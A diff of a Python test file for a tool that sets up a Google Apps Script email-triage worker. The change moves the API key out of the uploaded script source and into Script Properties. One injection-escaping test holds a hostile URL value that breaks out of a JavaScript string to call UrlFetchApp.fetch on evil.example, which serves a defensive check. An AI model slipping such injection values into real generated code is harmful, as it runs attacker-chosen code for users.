@@ -1,65 +1,59 @@
+import json
+from pathlib import Path
+from unittest.mock import MagicMock, patch
+
 import pytest
-from unittest.mock import patch, MagicMock
+
 from jev_mcp.email_triage.gas_setup import setup_gas_workflow
 
+TEMPLATE_PATH = Path(__file__).parent.parent / "examples" / "gas_triage.js"
 
-@patch("jev_mcp.email_triage.gas_setup.getpass.getpass")
-@patch("jev_mcp.email_triage.gas_setup.input")
-@patch("jev_mcp.email_triage.gas_setup.build")
-@patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
-@patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
-def test_gas_setup_prompts(
-    mock_flow, mock_exists, mock_build, mock_input, mock_getpass
-):
-    """Asserts the CLI uses getpass to securely prompt for the API key."""
-    # Mock inputs
-    mock_input.return_value = "https://test.ngrok.app/api/v1/triage/email"
-    mock_getpass.return_value = "test-secret-key"
 
-    # Mock OAuth flow
+def _mock_google(mock_flow, mock_build):
     mock_flow_instance = MagicMock()
     mock_flow_instance.run_local_server.return_value = "mock_creds"
     mock_flow.from_client_secrets_file.return_value = mock_flow_instance
 
-    # Mock Google API Client
     mock_service = MagicMock()
     mock_build.return_value = mock_service
-    # We setup the return value on the execution of the call
-    mock_create = MagicMock()
-    mock_create.execute.return_value = {"scriptId": "12345"}
-    mock_service.projects().create.return_value = mock_create
+    mock_service.projects().create.return_value.execute.return_value = {
+        "scriptId": "12345"
+    }
+    return mock_service
 
-    # Mock file reading
+
+def _uploaded_source(mock_service):
+    call = mock_service.projects().updateContent.call_args[1]
+    return call["body"]["files"][0]["source"]
+
+
+@patch("jev_mcp.email_triage.gas_setup.input")
+@patch("jev_mcp.email_triage.gas_setup.build")
+@patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
+@patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
+def test_gas_setup_prompts_for_the_webhook_url_only(
+    mock_flow, mock_exists, mock_build, mock_input
+):
+    mock_input.return_value = "https://test.ngrok.app/api/v1/triage/email"
+    mock_service = _mock_google(mock_flow, mock_build)
+
     with patch("builtins.open", new_callable=MagicMock) as mock_open:
         mock_file = MagicMock()
-        mock_file.read.return_value = (
-            "const WEBHOOK = 'TEMPLATE'; const API_KEY = 'TEMPLATE';"
-        )
+        mock_file.read.return_value = "const JEV_MCP_WEBHOOK_URL = 'TEMPLATE';"
         mock_open.return_value.__enter__.return_value = mock_file
 
-        # Run
         script_url = setup_gas_workflow()
 
     assert "script.google.com" in script_url
     assert "12345" in script_url
-
-    # Verify getpass was called
-    mock_getpass.assert_called_once_with(
-        "Create a new secure password (API Key) to protect your local webhook. Type or paste it now (input will be hidden): "
-    )
-
-    # Verify Google API was called
+    mock_input.assert_called_once()
     mock_service.projects().create.assert_called_once_with(
         body={"title": "Jev-Mail Triage Worker"}
     )
     mock_service.projects().updateContent.assert_called_once()
-
-    # Verify the code payload injected the variables
-    update_call_args = mock_service.projects().updateContent.call_args[1]
-    files = update_call_args["body"]["files"]
-    code_content = files[0]["source"]
-    assert "test-secret-key" in code_content
-    assert "https://test.ngrok.app/api/v1/triage/email" in code_content
+    assert "https://test.ngrok.app/api/v1/triage/email" in _uploaded_source(
+        mock_service
+    )
 
 
 @patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow", None)
@@ -69,27 +63,16 @@ def test_gas_setup_missing_dependencies():
         setup_gas_workflow()
 
 
-@patch("jev_mcp.email_triage.gas_setup.getpass.getpass")
 @patch("jev_mcp.email_triage.gas_setup.input")
 @patch("jev_mcp.email_triage.gas_setup.build")
 @patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
 @patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
-def test_gas_setup_fallback_prepend(
-    mock_flow, mock_exists, mock_build, mock_input, mock_getpass
+def test_gas_setup_fallback_prepends_the_webhook_url(
+    mock_flow, mock_exists, mock_build, mock_input
 ):
-    """Asserts that code correctly prepends variables if replacement fails."""
+    """Asserts that the URL is prepended when the template has no placeholder."""
     mock_input.return_value = "https://test.ngrok.app"
-    mock_getpass.return_value = "test-secret"
-
-    mock_flow_instance = MagicMock()
-    mock_flow_instance.run_local_server.return_value = "mock_creds"
-    mock_flow.from_client_secrets_file.return_value = mock_flow_instance
-
-    mock_service = MagicMock()
-    mock_build.return_value = mock_service
-    mock_create = MagicMock()
-    mock_create.execute.return_value = {"scriptId": "12345"}
-    mock_service.projects().create.return_value = mock_create
+    mock_service = _mock_google(mock_flow, mock_build)
 
     with patch("builtins.open", new_callable=MagicMock) as mock_open:
         mock_file = MagicMock()
@@ -98,69 +81,43 @@ def test_gas_setup_fallback_prepend(
 
         setup_gas_workflow()
 
-    update_call_args = mock_service.projects().updateContent.call_args[1]
-    code_content = update_call_args["body"]["files"][0]["source"]
+    code_content = _uploaded_source(mock_service)
     assert 'const JEV_MCP_WEBHOOK_URL = "https://test.ngrok.app";' in code_content
-    assert 'const JEV_MCP_API_KEY = "test-secret";' in code_content
+    assert "JEV_MCP_API_KEY" not in code_content
 
 
-@patch("jev_mcp.email_triage.gas_setup.getpass.getpass")
 @patch("jev_mcp.email_triage.gas_setup.input")
 @patch("jev_mcp.email_triage.gas_setup.build")
 @patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
 @patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
-def test_gas_setup_file_not_found(
-    mock_flow, mock_exists, mock_build, mock_input, mock_getpass
-):
+def test_gas_setup_file_not_found(mock_flow, mock_exists, mock_build, mock_input):
     """Asserts that it handles FileNotFoundError when reading the template."""
     mock_input.return_value = "https://test.ngrok.app"
-    mock_getpass.return_value = "test-secret"
-
-    mock_flow_instance = MagicMock()
-    mock_flow_instance.run_local_server.return_value = "mock_creds"
-    mock_flow.from_client_secrets_file.return_value = mock_flow_instance
-
-    mock_service = MagicMock()
-    mock_build.return_value = mock_service
-    mock_create = MagicMock()
-    mock_create.execute.return_value = {"scriptId": "12345"}
-    mock_service.projects().create.return_value = mock_create
+    mock_service = _mock_google(mock_flow, mock_build)
 
     with patch("builtins.open", side_effect=FileNotFoundError):
         setup_gas_workflow()
 
-    update_call_args = mock_service.projects().updateContent.call_args[1]
-    code_content = update_call_args["body"]["files"][0]["source"]
-    assert "test-secret" in code_content
+    assert "https://test.ngrok.app" in _uploaded_source(mock_service)
 
 
 @patch("jev_mcp.email_triage.gas_setup.build")
 @patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
 @patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
 def test_gas_setup_with_args(mock_flow, mock_exists, mock_build):
-    """Asserts that the CLI skips prompts when arguments are provided."""
-    mock_flow_instance = MagicMock()
-    mock_flow_instance.run_local_server.return_value = "mock_creds"
-    mock_flow.from_client_secrets_file.return_value = mock_flow_instance
-
-    mock_service = MagicMock()
-    mock_build.return_value = mock_service
-    mock_create = MagicMock()
-    mock_create.execute.return_value = {"scriptId": "12345"}
-    mock_service.projects().create.return_value = mock_create
+    """Asserts that the CLI skips the prompt when the URL is provided."""
+    mock_service = _mock_google(mock_flow, mock_build)
 
     with patch("builtins.open", side_effect=FileNotFoundError):
-        setup_gas_workflow(webhook_url="https://args.ngrok.app", api_key="args-secret")
+        setup_gas_workflow(webhook_url="https://args.ngrok.app")
 
-    update_call_args = mock_service.projects().updateContent.call_args[1]
-    code_content = update_call_args["body"]["files"][0]["source"]
-    assert "https://args.ngrok.app" in code_content
-    assert "args-secret" in code_content
+    assert "https://args.ngrok.app" in _uploaded_source(mock_service)
 
 
 def test_gas_setup_import_error():
-    import sys
     import importlib
+    import sys
+
     import jev_mcp.email_triage.gas_setup
 
     with patch.dict(sys.modules, {"google_auth_oauthlib.flow": None}):
@@ -173,27 +130,60 @@ def test_gas_setup_import_error():
 @patch("jev_mcp.email_triage.gas_setup.build")
 @patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
 @patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
-def test_gas_setup_writes_values_as_escaped_js_string_literals(
+def test_gas_setup_writes_the_url_as_an_escaped_js_string_literal(
     mock_flow, mock_exists, mock_build
 ):
-    """A quote in the key or URL must not end the JavaScript string it is written into."""
-    import json
-
-    mock_service = MagicMock()
-    mock_build.return_value = mock_service
-    mock_service.projects().create.return_value.execute.return_value = {
-        "scriptId": "12345"
-    }
-    hostile_key = "k'; UrlFetchApp.fetch('https://evil.example'); '"
-    hostile_url = "https://hook.example/a'b"
+    """A quote in the URL must not end the JavaScript string it is written into."""
+    mock_service = _mock_google(mock_flow, mock_build)
+    hostile_url = (
+        "https://hook.example/a'; UrlFetchApp.fetch('https://evil.example'); '"
+    )
 
     with patch("builtins.open", side_effect=FileNotFoundError):
-        setup_gas_workflow(webhook_url=hostile_url, api_key=hostile_key)
+        setup_gas_workflow(webhook_url=hostile_url)
 
-    code = mock_service.projects().updateContent.call_args[1]["body"]["files"][0][
-        "source"
-    ]
-    assert json.dumps(hostile_key) in code
+    code = _uploaded_source(mock_service)
     assert json.dumps(hostile_url) in code
-    assert f"'{hostile_key}'" not in code
     assert f"'{hostile_url}'" not in code
+
+
+@patch("jev_mcp.email_triage.gas_setup.build")
+@patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
+@patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
+def test_the_webhook_key_never_enters_the_uploaded_source(
+    mock_flow, mock_exists, mock_build, monkeypatch
+):
+    monkeypatch.setenv("JEV_MCP_API_KEY", "env-key-must-not-be-uploaded")
+    mock_service = _mock_google(mock_flow, mock_build)
+
+    setup_gas_workflow(webhook_url="https://hook.example/api")
+
+    body = mock_service.projects().updateContent.call_args[1]["body"]
+    assert "env-key-must-not-be-uploaded" not in json.dumps(body)
+
+
+@patch("jev_mcp.email_triage.gas_setup.build")
+@patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
+@patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
+def test_gas_setup_tells_the_user_to_set_the_script_property(
+    mock_flow, mock_exists, mock_build, capsys
+):
+    _mock_google(mock_flow, mock_build)
+
+    setup_gas_workflow(webhook_url="https://hook.example/api")
+
+    out = capsys.readouterr().out
+    assert "Script Properties" in out
+    assert "JEV_MCP_API_KEY" in out
+
+
+def test_gas_setup_no_longer_accepts_an_api_key():
+    with pytest.raises(TypeError):
+        setup_gas_workflow(webhook_url="https://hook.example/api", api_key="k")
+
+
+def test_the_template_reads_the_key_from_script_properties_not_source():
+    source = TEMPLATE_PATH.read_text()
+
+    assert "PropertiesService.getScriptProperties()" in source
+    assert "const JEV_MCP_API_KEY" not in source
